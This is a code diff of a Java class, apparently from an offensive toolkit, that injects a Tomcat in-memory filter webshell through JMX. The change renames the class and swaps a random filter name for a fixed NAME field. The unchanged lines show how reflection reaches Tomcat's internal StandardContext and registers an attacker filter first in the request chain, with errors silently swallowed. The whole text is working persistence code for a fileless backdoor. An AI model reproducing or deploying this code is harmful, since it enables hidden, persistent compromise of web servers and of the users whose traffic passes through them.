@@ -20,13 +20,13 @@ import java.util.Set;
  * 使用 JMX Bean 注入 Tomcat Filter 型内存马
  * @author nu1r
  */
-public class TFJMX implements Filter{
+public class TSMSFromJMXF implements Filter{
     public static String pattern;
+
+    public static String NAME;
 
     static {
         try {
-            String filterName = String.valueOf(System.nanoTime());
-
             MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
             Field       field       = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
             field.setAccessible(true);
@@ -55,7 +55,7 @@ public class TFJMX implements Filter{
                 field.setAccessible(true);
                 HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);
 
-                if (map.get(filterName) == null) {
+                if (map.get(NAME) == null) {
                     //生成 FilterDef
                     //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                     Class filterDefClass = null;
@@ -66,8 +66,8 @@ public class TFJMX implements Filter{
                     }
 
                     Object filterDef = filterDefClass.newInstance();
-                    filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, filterName);
-                    Filter filter = new TFJMX();
+                    filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, NAME);
+                    Filter filter = new TSMSFromJMXF();
 
                     filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, filter.getClass().getName());
                     filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, filter);
@@ -83,7 +83,7 @@ public class TFJMX implements Filter{
                     }
 
                     Object filterMap = filterMapClass.newInstance();
-                    filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, filterName);
+                    filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, NAME);
                     filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, DispatcherType.REQUEST.name());
                     filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, pattern);
                     //调用 addFilterMapBefore 会自动加到队列的最前面，不需要原来的手工去调整顺序了
@@ -93,7 +93,7 @@ public class TFJMX implements Filter{
                     Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClass);
                     constructor.setAccessible(true);
                     ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(new Object[]{standardContext, filterDef});
-                    map.put(filterName, filterConfig);
+                    map.put(NAME, filterConfig);
                 }
             }
         } catch (Exception ignored) {
